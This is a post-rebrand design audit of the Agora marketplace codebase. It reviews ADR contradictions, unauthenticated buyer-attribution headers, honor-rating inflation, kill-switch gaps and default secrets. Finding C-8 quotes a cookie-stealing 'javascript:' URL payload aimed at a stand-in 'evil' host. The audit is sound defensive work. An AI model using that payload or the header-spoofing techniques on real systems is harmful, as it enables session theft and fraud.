# Agora — design audit (post-rebrand)

> Independent paper review. No code changes. No tests run. Reviewer
> approached the codebase fresh, reading `README.md`, `PAYMYAGENT.md`,
> ADRs 0001–0013, `docs/BUILD-SUMMARY.md`, and a targeted scan of the
> sources. The project was renamed LUMEN → Andromeda → Agora; the
> Andromeda audit at this same path is the prior version this one
> overwrites. This audit looks at: (a) post-rebrand additions
> (`dashboard/`, `web/`, ADR 0013 triple-aliasing), and (b) the original
> findings — whether they hold, shift, or are addressed.

---

## 1. Coherence findings

### 1.1 ADR-vs-ADR contradictions

**C-1 (was, still). "No accounts, no email" vs. registry pubkey upsert.**
ADR 0001 frames Agora as account-free; ADR 0004 + the schema make the
Ed25519 pubkey *the* account (PRIMARY KEY in `sellers`, signed upsert
write-protection). The rhetorical contradiction is unchanged. ADR 0013
did not amend the framing.

**C-2 (was, still). "Blind" reviewer assignment is not blind.**
`registry/src/lib/reviews.ts::pickRandomReviewer` returns the row with
`subject_pubkey` to the reviewer via `getReviewerAssignments`. The
reviewer trivially derives the seller. No commit-reveal, no `seed`
column, no transcript. ADR 0010 still markets this as a primitive. No
change.

**C-3 (was, still). Real-mode dataset path doesn't exist.**
`agents/dataset-seller/src/server.js` still serves the JSON fixture
unconditionally. ADR 0008's "actual file lives on disk (configured via
env)" remains vapor. No change.

**C-4 (was, still). Dispute path slashes on the disputer's say-so.**
`/api/v1/reviews/[id]/dispute/route.ts` calls `slashReviewer` with
`evidence: json.evidence ?? {}` and never verifies (a) the disputer is a
buyer-of-record, (b) the evidence is well-formed, (c) silent re-review
deviation. ADR 0010 §"Two-sided slashing" is unimplemented as written.
No change.

**C-5 (was, still). Tx record is seller-signed; buyer field is unsigned.**
`registry/src/app/api/v1/transactions/record/route.ts` still verifies
only `auth.pubkey === seller_pubkey`; `buyer_pubkey` is whatever the
seller posts. No change.

**C-6 (NEW, post-ADR 0013). The verifier "accepts three header families"
claim is contradicted by the registry's own gate.**
`registry/src/lib/sig.ts::verifySignedRequest` performs a manual
pre-check:

```ts
if (!headers[HDR_PUBKEY] || !headers[HDR_SIG] || !headers[HDR_TIMESTAMP])
  return { ok: false, status: 401, reason: "missing signature headers" };
```

`HDR_PUBKEY` etc. resolve to the canonical `x-agora-*` constants only.
A request with `x-andromeda-*` or `x-lumen-*` headers (the legacy
families ADR 0013 promises to accept) is rejected with 401 *before*
`verifyRequest` (which DOES iterate all three families) is ever called.

The phase-1b regression test (`scripts/test-phase1b.js:123`) injects a
tampered `x-andromeda-*` set and asserts 401 — but it is the wrong 401
("missing signature headers" instead of "signature invalid"). The test
shape passes either way, so neither the design nor the test detect the
bug. **The "registry accepts the legacy header family" half of ADR 0013
is unimplemented.**

The provider's *naked* buyer-attribution headers (the
`x-agora-pubkey ?? x-andromeda-pubkey ?? x-lumen-pubkey` fallback chain
in `provider/src/app/api/v1/listing-verify/route.ts:38-41`) DO accept
all three names — but those are unauthenticated to begin with (S3
below), so this isn't a guarded path.

**C-7 (NEW, ADR 0011). Dashboard kill-switch isn't enforced on registry
proxy endpoints.**
ADR 0011 §3 (third bullet) says: *"When the kill-switch is on, the
control plane can refuse to proxy registry calls (future work) so the
human's 'halt' actually halts the dashboard's external chatter."* The
current `mcp/control-plane.js` handler enforces kill-switch only inside
`budget.js::reserve()`, which is called by paid MCP tools. The five new
proxy endpoints (`/balance`, `/transactions`, `/subscriptions`,
`/subscriptions/:id/cancel`, `/sellers`) do not check
`getKillSwitch()`. The dashboard UI tells users *"When ON, every paid
MCP tool refuses with `kill_switch_active`"* (`Allowance.tsx:96`),
which is technically true — but the MCP HTTP proxy that the dashboard
itself talks through happily continues to make outbound calls (and the
SPA continues to issue them), which contradicts the ADR's stated goal
("halts the dashboard's external chatter"). The "future work"
admission is honest at the ADR level; the UI copy isn't.

Notably, `POST /subscriptions/:id/cancel` — a *write* — is also gated
by neither kill-switch nor budget. A compromised dashboard origin (see
S5 below) can cancel any subscription whose ID it knows.

**C-8 (NEW, ADR 0012). Seller URL is rendered into `<a href>` without
scheme validation.**
The web index renders `seller.url` from the registry directly into
`href` attributes (`web/src/app/sellers/[pubkey]/page.tsx:51-58`,
`web/src/app/services/[id]/page.tsx:93-100`). No scheme allowlist, no
URL parsing, no sanitization. Registration accepts any string —
`registry/src/app/api/v1/sellers/register/route.ts:33-38` only checks
truthiness. A malicious seller can register `url:
"javascript:fetch('//evil/'+document.cookie)"`. React escapes the body
text by default (so `<script>` in `description` is inert), but
`href="javascript:..."` is not auto-blocked by JSX prior to React 19's
`react-dom` URL sanitizer landing universally — and even where blocked,
`<a target="_blank" rel="noopener">` does not protect against scheme
poisoning. The ADR 0012 trust-boundary discussion does not mention
this; the audit prompt asked specifically about it.

The same registration path also accepts arbitrary HTML in
`description` and `name`. They render as inert text via JSX, so no
direct XSS — but if any future surface re-renders these via
`dangerouslySetInnerHTML` (e.g. an OG-image generator, a feed, an
RSS), the input is unsanitized at the source.

### 1.2 Code decisions absent from any ADR

(All from the prior audit unchanged unless noted.)

- **D-1.** `service-id = pubkey[:8] + ":" + local_id` — 32-bit prefix,
  birthday-collision risk. No ADR. (`registry/src/lib/db.ts:101`)
- **D-2.** Macaroon HMAC binds only `payment_hash`/`resource`/`amount`/
  `exp` — no buyer pubkey caveat, no nonce. No ADR.
- **D-3.** `slashReviewer` writes a ghost seller row when the slashed
  reviewer doesn't exist as a seller. Ghost rows surface in
  `GET /v1/sellers`. (`registry/src/lib/reviews.ts:142-146`)
- **D-4.** Dispute audit log HMAC default secret literal:
  `"registry-default-secret-please-set-something-stronger"` is committed
  in the source as fallback (`reviews/[id]/dispute/route.ts:23`).
  Default deployments → unfalsifiable audit signatures.
- **D-5.** `agora_purchase_dataset` couples to a per-seller
  `/api/dev/pay` endpoint. No ADR.
- **D-6.** Dataset-seller and provider both record tx with
  `buyer_pubkey ?? null` from an unauthenticated header. (Now
  three-way: `x-agora-* ?? x-andromeda-* ?? x-lumen-*`.)
- **D-7 (NEW).** Dashboard SPA persists the bearer token in
  `localStorage` (`dashboard/src/lib/controlPlane.ts:9-46`). Any
  XSS in the SPA — or any future browser-extension privilege
  problem — leaks the control-plane token, which has full kill-switch
  authority and can cancel subscriptions. ADR 0011 doesn't discuss
  this.
- **D-8 (NEW).** The control-plane CORS allow-list reads
  `AGORA_DASHBOARD_ORIGINS ?? ANDROMEDA_DASHBOARD_ORIGINS ??
  LUMEN_DASHBOARD_ORIGINS` and defaults to `http://localhost:5173`. No
  ADR mentions the env override; there is no allow-list for `origins:
  ""` (file: scheme); a Tauri shell would need to add
  `tauri://localhost` (the ADR foreshadows this but does not pin a
  date or name a single source of truth).
- **D-9 (NEW).** Triple-aliasing means the *naked* attribution header
  resolution chain on each paid-endpoint widens from one acceptable
  header (Andromeda era) to three (post-ADR 0013). Header-confusion
  surface for buyer attribution grew; nothing in ADR 0013 frames this
  as a trade-off. (See S3.)

### 1.3 Architecture-vs-reality drift

ADR 0001's diagram still shows a "Tauri Dashboard" at the bottom. ADR
0006 / 0011 say: SPA-first, Tauri optional, Tauri shell deferred until
`cargo` is available. The implementation aligns with the ADR-0011
position — Vite SPA in `dashboard/`, Tauri-stub script that no-ops on
machines without Rust. The ADR-0001 diagram is still not annotated; a
new reader looking only at ADR 0001 will infer a Tauri app exists.

Public web index (`web/`): the architecture promotes a fourth Next.js
surface (after provider/registry/market-monitor — well, market-monitor
is Express). ADR 0012 doesn't mention that the web app issues
*server-side* `fetch()` to the registry without any signed-request
flow, which is correct for read-only access but means the web app is
fully trusted by the registry to make the right read-only choices —
i.e. the trust boundary the ADR claims (read-only, server-side) is
real but undefended-in-depth: a misconfigured deployment could expose
the registry's port directly to clients, defeating the boundary.

---

## 2. Spec gaps

### 2.1 Built-but-not-claimed (silent additions)

| Endpoint / behaviour                                       | Stated where? |
|------------------------------------------------------------|---------------|
| `POST /api/v1/admin/fast-forward`                          | Build-summary only |
| `POST /api/dev/tick` (market-monitor)                      | Build-summary only |
| Heartbeat 60s self-re-register                             | ADR 0004 footnote |
| Reviewer ghost-seller insert (D-3)                         | Nowhere |
| Service-id 8-hex prefix collision surface                  | Nowhere |
| FTS5 query token sanitization (raw `q` → SQLite FTS5)      | Nowhere |
| **Dashboard SPA → control-plane proxy → registry path**    | ADR 0011 §3 (well-stated) |
| **Web index → registry direct fetch**                      | ADR 0012 (well-stated) |
| **Triple-aliasing on naked attribution header**            | ADR 0013 §"naked header" line — but trade-offs absent |
| Dashboard `localStorage` bearer-token persistence          | Nowhere |
| Web app's `<a href={seller.url}>` rendering                | Nowhere |

### 2.2 Claimed-but-missing or partial

(Same as previous audit, plus rebrand-era claims.)

| Claimed in                                                  | Reality |
|-------------------------------------------------------------|---------|
| ADR 0008: "actual file lives on disk (configured via env)"  | Not implemented (C-3). |
| ADR 0010: silent re-review sampling                         | Not implemented. |
| ADR 0010: buyer-side fraud slashing                         | Not implemented. |
| ADR 0010: per-service "peer-reviewed" badge                 | Implemented as per-seller. |
| ADR 0005: real-mode subscribe deposit via L402              | Not implemented. |
| ADR 0005: cancel-refund in real mode                        | Not implemented. |
| ADR 0008: two-step Lightning settlement to platform         | Counter only. |
| ADR 0011 §3: "kill-switch refuses to proxy registry calls"  | Not implemented (C-7). UI copy implies it is. |
| ADR 0013: "verifier accepts EITHER family on incoming"      | Half-implemented for signed writes (C-6). Pre-gate rejects `x-andromeda-*` and `x-lumen-*` requests as "missing signature headers" before `verifyRequest` is consulted. |
| ADR 0012: read-only public index                            | True (no write paths) — but `seller.url` injection vector is ignored in trust-boundary writeup (C-8). |
| Phase 7 "robots permissive, sitemap dynamic"                | Implemented. |

### 2.3 Test-script coverage gaps per phase

Largely unchanged from the prior audit. Newly notable:

- `scripts/test-phase1b.js` asserts `x-andromeda-*` tampered → 401 but
  doesn't distinguish "signature invalid" from "missing signature
  headers" — masks C-6.
- `scripts/test-phase3-ui.js` (per BUILD-SUMMARY) verifies CORS
  preflight from `evil.com` is rejected and that endpoint paths appear
  in the bundle string — it does not assert that the kill-switch
  refuses to proxy `/sellers` or cancel a subscription. So C-7 is
  un-tested.
- The web index test (`scripts/test-phase7.js`) is described as "7
  pages, sitemap, robots." Whether it tests `<a href=javascript:...>`
  rejection or `description` HTML escaping is unclear from the
  build-summary alone; the page code suggests **no scheme validation
  exists at all**, so any such test would either skip the case or
  assert the broken behaviour. (Uncovered — see C-8.)

---

## 3. Money-flow traces

### 3.1 Single L402 listing-verify call (240 sat)

```
buyer_wallet ── 240 sat (Lightning) ──► provider_wallet
                                          │
                              (settled preimage)
                                          │
                              fire-and-forget HTTP POST
                                          ▼
                            registry: transactions.record
                                  amount_sats=240
                                  platform_fee_sats=5  (rounded 2%, seller-set)
                            (NO money moves to platform — counter only)
```

Hops where money / integrity can be lost:

- **L1.** L402 macaroon-bound to `payment_hash` only — if any third
  party pays the bolt-11, the macaroon-holder still gets access.
- **L2.** `txId = "tx_" + payment_hash[:24]` — across providers,
  prefix collisions could occur; UNIQUE constraint silently drops the
  second.
- **L3.** `platform_fee_sats` is set by the seller in the signed body
  — the registry doesn't recompute. Fee can be 0 with no consequence.
- **L4.** No two-step settlement; platform never sees sats.
- **L5 (post-rebrand).** Buyer attribution header now resolves
  `x-agora-pubkey ?? x-andromeda-pubkey ?? x-lumen-pubkey`. An
  off-protocol attacker who sends an L402-paid call with
  `x-lumen-pubkey: <victim>` will write `<victim>` into the registry
  ledger as the buyer of that tx — gaming `rateSeller`'s 30-day-tx
  gate (S3 below) for any victim pubkey, not just the attacker's own.

### 3.2 Dataset purchase + peer review

Identical flow to before. `escrow_sats` is fictitious (no payment
proof), `reviewer_payout_sats` is returned in JSON but no
`reviewer_owed` ledger column exists, slashing escrow clawback is a
JSON field with no balance write. No change.

### 3.3 Honor inflation via repeated `rateSeller`

Unchanged. `UPDATE sellers SET honor = honor + ?` runs on every call.
No (buyer, seller) UNIQUE index, no per-tx binding. **One 240-sat
purchase + a rate loop = ±2 honor per request, unbounded.** This
remains the highest-severity finding.

---

## 4. Trust-model matrix

| Privileged action                                | Triggered by                                           | Verification                                                                                                | Publicly auditable? |
|--------------------------------------------------|--------------------------------------------------------|-------------------------------------------------------------------------------------------------------------|---------------------|
| Seller registration / upsert                     | Seller (signed)                                        | Ed25519 sig (Agora family pre-check; legacy families silently rejected — C-6)                               | YES |
| Service catalog write                            | Seller (signed)                                        | Ed25519 sig                                                                                                 | YES |
| Tx record                                        | Seller (signed) — buyer_pubkey unsigned                | Sig matches `seller_pubkey` only                                                                            | PARTIAL |
| `platform_fee_sats` value                        | Seller (signed)                                        | NONE — server stores whatever number                                                                        | NO |
| Buyer rating (`/rate`)                           | Buyer (signed)                                         | 30-day tx exists — but tx-buyer field is forgeable (S3) and per-(buyer,seller) uniqueness absent (S1)        | PARTIAL |
| Review request                                   | Seller (signed)                                        | Sig only — no escrow proof of payment                                                                       | NO |
| Reviewer availability                            | Reviewer (signed)                                      | Ed25519 sig                                                                                                 | YES |
| Review submission                                | Reviewer (signed)                                      | Sig + rubric validation                                                                                     | YES |
| Slashing / dispute                               | Anyone with a valid Ed25519 keypair                    | Sig only; no buyer-of-record check; HMAC default-secret fallback (D-4)                                      | YES (event row, but evidence is whatever the disputer posts) |
| Honor decay                                      | Lazy on `GET /sellers/:pubkey` OR admin-secret POST    | None server-side beyond `decay_runs` self-coordination                                                      | YES (decay_runs row) |
| Reviewer assignment ("random-weighted")          | Seller's `request_review`                              | Server picks; no commit-reveal, no published seed                                                            | NO |
| Honor delta per rating                           | Buyer                                                  | None — unbounded per (buyer, seller)                                                                        | NO |
| Admin endpoints                                  | Holder of `ADMIN_SECRET` (default `"dev-admin-secret"`)| Plain header check                                                                                          | NO |
| **Kill-switch on dashboard SPA flow**            | Holder of control-plane bearer token                   | Bearer auth; CORS allow-list `localhost:5173` only                                                          | YES (control plane logs) |
| **Cancel subscription via control plane proxy**  | Holder of control-plane bearer token                   | Bearer auth ONLY; not gated by kill-switch (C-7) or budget                                                  | NO (no audit log on cancel) |
| **Sellers list (public web index)**              | Anyone hitting `GET /api/v1/sellers`                   | None — public read                                                                                          | YES |
| **`<a href={seller.url}>`** (web index)          | Visitor click                                          | None — registry returns whatever `url` was registered (C-8); web app does not validate scheme              | NO |

Privileged actions the registry/control-plane can do that are not publicly auditable: the prior audit's A1–A5 stand. Add:

- **A6 (NEW).** Control-plane operator (anyone holding the bearer
  token) can cancel any local subscription without an audit log
  entry.
- **A7 (NEW).** Web index could be replaced or rerouted to a
  different registry without any signed integrity check (the URL is
  just an env var).

---

## 5. Cold-start risk register

Unchanged from prior audit; new entries for post-rebrand surfaces.

| Feature                                | Liquidity required | N=0 / N=1 behaviour |
|----------------------------------------|--------------------|---------------------|
| Orchestrator `recommend`               | ≥1 service         | N=1 → `intent_match` dominates trivially. |
| Search                                 | ≥1 service         | N=0 → empty list. |
| Honor ranking                          | ≥1 honor signal    | All start at 0; `maxHonor=1` forced; honor weight is dead weight in v0. |
| Peer review                            | ≥2 distinct pubkeys | "weighted random" meaningless at N=1; ADR's blindness claim doesn't hold below 2–3 reviewers. |
| Buyer rating                           | ≥1 prior tx (30d)  | First-week sellers can't be rated; bootstrapping requires off-system trust. |
| Subscriptions                          | ≥1 subscriber      | Watcher loops idle. |
| Dataset marketplace                    | ≥1 dataset         | Single seller, no ranking signal between datasets. |
| Slashing / dispute                     | Any reviewer       | Dispute path fires before liquidity does (anyone signed can dispute) — wrong cold-start signal. |
| Platform-fee revenue                   | ≥1 settled tx      | Counter only; no payout pipe. |
| **Public web index `aggregateStats`**  | ≥1 seller          | N=0 sellers → header reads `Sellers — / Services — / Transactions — / Sats moved —`. Acceptable. |
| **Dashboard SPA `/sellers` proxy**     | Registry online    | Registry down → proxy returns 502; SPA shows error block. Acceptable. |
| **Dashboard SPA balance**              | NWC reachable (real mode) or always-mock | Real-mode + NWC unreachable → balance object with `error` and `null` sats. |

Concentrated-at-N≈1 risks: same as before (orchestrator collapses,
single reviewer is the only option, first buyer can't rate first
seller). The new public web surface makes these failure modes more
visible, not worse.

---

## 6. Moat-test results per seller type

The "make-vs-buy-vs-spawn" framework is still not documented in the
codebase; I evaluate against the inferred standard.

| Seller            | Sells                                              | Make-it-yourself cost            | Buy-from-existing-API alternative    | Moat as built |
|-------------------|----------------------------------------------------|----------------------------------|--------------------------------------|---------------|
| `vision-oracle-3` | OSM-geocoded listing verify + signed receipt       | OSM Nominatim is free            | Direct Nominatim                     | **WEAK.** Moat is the L402 demo + signed proof, not the data. |
| `market-monitor`  | GHSA advisories + filter + debounced delivery       | GitHub publishes advisories.json | Direct GitHub + cron                 | **VERY WEAK.** No auth, no ETag caching; "we already wrote the cron" is the only value. |
| `dataset-seller`  | NOAA PNW 2015–25                                   | NOAA opendata + S3 cli           | Wget                                 | **PROMISED-NOT-DELIVERED.** Provenance + signed contents are ADR claims; code serves a 20 KB JSON fixture in both modes. |
| Reviewer          | Independent rubric + slashing-backed honesty       | Hire any LLM judge               | None off-the-shelf                   | **CONDITIONAL.** Slashing teeth are fictitious money on a default-secret HMAC log; moat depends on a settlement layer that doesn't exist. |
| **Web index (`web/`)** | Read-only browse over the registry             | The registry's own JSON endpoints | A tab with `curl` + `jq`             | **N/A — not a paid seller.** Moat is UX (a pretty page over public data); it doesn't gate any payment. |
| **Dashboard SPA** | Local-only kill-switch UI + tx log                 | Curl the control plane           | Doesn't apply (per-host human tool)  | **N/A — local utility.** Moat is convenience, not economics. |

Drift summary unchanged: provider holds (because the demo intent IS
the protocol), market-monitor erodes, dataset is promised-not-built,
reviewer depends on a missing settlement layer.

---

## 7. Status of previous audit's top 5 concerns

| # | Concern                                                                          | Status   | Notes |
|---|----------------------------------------------------------------------------------|----------|-------|
| 1 | CRITICAL — honor unbounded and trivially gamed (no per-(buyer,seller) UNIQUE)    | **STILL** | `rateSeller` is byte-for-byte unchanged. ADR 0010 is not amended. |
| 2 | CRITICAL — review economics decorative (no Lightning escrow / payouts / slashing)| **STILL** | Build-summary §6.4 still admits this. No `reviewer_owed` table; HMAC default secret still committed. |
| 3 | HIGH — buyer attribution on tx records unauthenticated                            | **SHIFTED (worse)** | Header chain widened to `x-agora-* ?? x-andromeda-* ?? x-lumen-*` post-ADR 0013. Three names now spoofable; ADR 0013 doesn't analyze the trade-off. |
| 4 | HIGH — "blind" reviewer assignment isn't blind, "random" isn't verifiable        | **STILL** | `pickRandomReviewer` + `getReviewerAssignments` unchanged. |
| 5 | HIGH — 2% platform fee is a counter, not a payout                                | **STILL** | `platform_fee_sats` still seller-supplied; no `PLATFORM_NWC_URL` payout wired. |

Net: **0 of 5 addressed**, **1 shifted (worse)**, **4 unchanged**.

---

## 8. Top 5 design concerns (post-rebrand, ranked by severity)

### S1 — CRITICAL · Honor system is unbounded and trivially gamed

Unchanged from previous audit; still rank-1. `POST /sellers/:pubkey/rate`
has no per-(buyer, seller) UNIQUE constraint. One 240-sat purchase
buys an attacker an unbounded honor-rating loop. Honor feeds (a) the
orchestrator's 20% ranking weight and (b) reviewer pick-weighting in
`pickRandomReviewer`. Game one rating loop, win the review queue.

### S2 — CRITICAL · Review economics are decorative

Unchanged. Escrow is a number on a row; `reviewer_payout_sats` is a
JSON field with no ledger backing; slashing audit log uses a
default-fallback HMAC string that is committed to the source. The
PayMyAgent narrative invokes "trust + slashing" as a feature; the
implementation is bookkeeping with no money behind it.

### S3 — HIGH · ADR 0013 widened the buyer-attribution header surface, not narrowed it

The post-rebrand naked-attribution chain on every paid endpoint
accepts `x-agora-pubkey ?? x-andromeda-pubkey ?? x-lumen-pubkey`. None
of these are authenticated. An attacker can attribute *any* purchase
to *any* victim pubkey by sending the right header. The previous
audit rated this HIGH at one header; ADR 0013 made it three. Combined
with S1, this means: a single attacker can rate up any seller using
any victim pubkey as the "buyer," skipping even the 30-day tx-history
gate (because they can fabricate the tx attribution themselves on a
single 240-sat purchase). ADR 0013 doesn't discuss the trade-off; the
phase-1b test passes the wrong way (C-6).

### S4 — HIGH · Registry's signed-write gate silently rejects two of the three header families it claims to accept

ADR 0013 §"Signed-request HTTP headers" says the verifier accepts all
three header families on incoming. `registry/src/lib/sig.ts:16` does
a manual pre-check using only the `x-agora-*` constants, returning
`401 missing signature headers` before delegating to
`verifyRequest()` (which itself does the right thing). Outcome: any
buyer that signed with `x-andromeda-*` or `x-lumen-*` headers is
rejected, contradicting the rebrand's explicit backwards-compat
promise. The test asserts 401 on tampered headers but does not
distinguish reasons, so the regression-shaped pass.

### S5 — HIGH · Dashboard kill-switch isn't enforced on control-plane proxy endpoints, and the bearer token is in `localStorage`

Two distinct issues that compound:

(a) ADR 0011 §3 promises the kill-switch will refuse to proxy
registry calls; the implementation only checks kill-switch inside
`budget.js::reserve()`. The five proxy endpoints (`/balance`,
`/transactions`, `/subscriptions`, `/subscriptions/:id/cancel`,
`/sellers`) bypass it. `POST /subscriptions/:id/cancel` is a
*write* not gated by either kill-switch or budget; the dashboard UI
copy ("every paid MCP tool refuses with `kill_switch_active`") is
misleading.

(b) The dashboard SPA stores the control-plane bearer token in
`localStorage` (`controlPlane.ts:9-46`). Any same-origin XSS — or any
malicious browser extension on `localhost:5173` — leaks a token with
unconditional control-plane authority. ADR 0011 chose `localStorage`
implicitly (no discussion of token storage security in §4 "state
store"). Combined with (a), a leaked token enables silent
subscription cancellation that the user's "halt" cannot stop.

### Honourable mention · `<a href={seller.url}>` is a `javascript:`-URL XSS vector in the public web index

Not in the top 5 because it requires (i) a malicious seller, (ii) a
human visitor clicking, and (iii) ignoring rel=noopener (which is
present). But: the registry doesn't validate the URL scheme on
registration, the web app doesn't validate it on render. A seller
who registers `url: "javascript:..."` will execute script in any
clicker's browser at the `localhost:3300` (or production) origin.
ADR 0012's trust-boundary discussion doesn't mention scheme
validation; this is the *direct* gap the audit prompt asked about.
HIGH if any production deployment exists; MEDIUM in the demo as
shipped.

---

## Appendix · Files inspected (post-rebrand)

In addition to the previous audit's set:

- `dashboard/src/App.tsx`, `dashboard/src/lib/store.ts`,
  `dashboard/src/lib/controlPlane.ts`, `dashboard/src/components/Allowance.tsx`,
  `dashboard/src/components/Setup.tsx`
- `mcp/control-plane.js`, `mcp/budget.js`
- `web/src/app/layout.tsx`, `web/src/app/page.tsx`,
  `web/src/app/sellers/page.tsx`, `web/src/app/sellers/[pubkey]/page.tsx`,
  `web/src/app/services/[id]/page.tsx`, `web/src/app/search/page.tsx`,
  `web/src/lib/registry.ts`, `web/src/components/pubkey.tsx`
- `packages/agora-core/src/signed-request.ts`
- `registry/src/lib/sig.ts`, `registry/src/lib/db.ts`,
  `registry/src/lib/reviews.ts`,
  `registry/src/app/api/v1/sellers/register/route.ts`,
  `registry/src/app/api/v1/transactions/record/route.ts`,
  `registry/src/app/api/v1/sellers/[pubkey]/rate/route.ts`,
  `registry/src/app/api/v1/reviews/[id]/dispute/route.ts`
- `provider/src/app/api/v1/listing-verify/route.ts`,
  `agents/dataset-seller/src/server.js`
- `docs/decisions/0001..0013-*.md`, `docs/BUILD-SUMMARY.md`,
  README.md, PAYMYAGENT.md

No code modified. No tests run.
